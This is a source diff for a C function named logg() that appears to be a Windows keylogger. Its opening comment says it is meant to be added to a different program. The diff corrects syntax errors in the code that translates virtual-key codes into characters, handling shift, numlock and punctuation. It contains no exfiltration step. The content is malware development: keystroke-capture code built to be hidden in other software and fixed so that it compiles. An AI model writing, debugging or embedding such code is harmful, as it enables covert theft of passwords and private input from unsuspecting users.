@@ -1,5 +1,4 @@
 //This is program itself it is ment to be added in the different program.
-
 DWORD WINAPI logg()
 {
     //Declared most importantly wanted variables.
@@ -70,14 +69,14 @@ DWORD WINAPI logg()
                 {
                     if(isL_SHIFT == 1 || isR_SHIFT == 1)
                     {
-                        showKey = NUMCHAR[vkey - 0x30]
+                        showKey = NUMCHAR[vkey - 0x30];
                     }
                 }
 
                 //For right side number pad
                 else if(vkey >= 0x30 && vkey <= 0x69 && isNUMLOCK == 1)
                 {
-                    showkey = (char)(vkey - 0x30);
+                    showKey = (char)(vkey - 0x30);
                 }
 
                 //For Printable characters 
@@ -89,7 +88,7 @@ DWORD WINAPI logg()
                     }
                     else
                     {
-                        showKey = char_vn[vkey - 0xBA]
+                        showKey = char_vn[vkey - 0xBA];
                     }
                 }
                 else if(vkey >= 0xDB && vkey <= 0xDF)
@@ -99,9 +98,6 @@ DWORD WINAPI logg()
                         showKey = char_vb[vkey - 0xDB];
                     }
                 }
-
-
-
 
                 //For side chars and space and etc
                 else if(vkey == 0x0D)
